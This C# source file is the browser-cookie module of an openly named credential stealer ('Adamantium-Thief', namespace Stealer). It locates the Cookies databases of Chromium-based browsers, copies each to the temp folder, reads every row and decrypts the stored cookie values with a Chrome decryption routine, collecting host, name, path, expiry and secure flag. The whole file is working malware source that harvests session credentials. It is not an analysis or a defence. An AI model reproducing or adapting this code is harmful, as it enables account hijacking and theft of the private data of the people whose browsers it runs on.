/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/
using System;
using System.IO;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    internal class Cookies
    {
        public static List<Cookie> Get()
        {
            string SqliteFile = "Cookies";
            List<Cookie> Cookies = new List<Cookie>();
            
            // Database
            string tempCookieLocation = "";

            // Search all browsers
            foreach (string browser in Paths.chromiumBasedBrowsers)
            {
                string Browser = Paths.GetUserData(browser) + SqliteFile;
                if (File.Exists(Browser))
                {
                    tempCookieLocation = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
                    if (File.Exists(tempCookieLocation))
                    {
                        File.Delete(tempCookieLocation);
                    }
                    File.Copy(Browser, tempCookieLocation);
                }
                else
                {
                    continue;
                }

                // Read chrome database
                SQLite sSQLite = new SQLite(tempCookieLocation);
                sSQLite.ReadTable("cookies");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string value = sSQLite.GetValue(i, 12);
                    string hostKey = sSQLite.GetValue(i, 1);
                    string name = sSQLite.GetValue(i, 2);
                    string path = sSQLite.GetValue(i, 4);
                    string expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));
                    string isSecure = sSQLite.GetValue(i, 6).ToUpper();

                
                    // If no data => break
                    if (string.IsNullOrEmpty(name))
                    {
                        break;
                    }

                    Cookie credentials = new Cookie();
                    credentials.value = Crypt.GetUTF8(Crypt.decryptChrome(value, Browser));
                    credentials.hostname = hostKey;
                    credentials.name = Crypt.GetUTF8(name);
                    credentials.path = path;
                    credentials.expiresutc = expires;
                    credentials.issecure = isSecure;

                    Cookies.Add(credentials);
                    continue;
                }
                continue;
            }
            return Cookies;
        }
    }
}
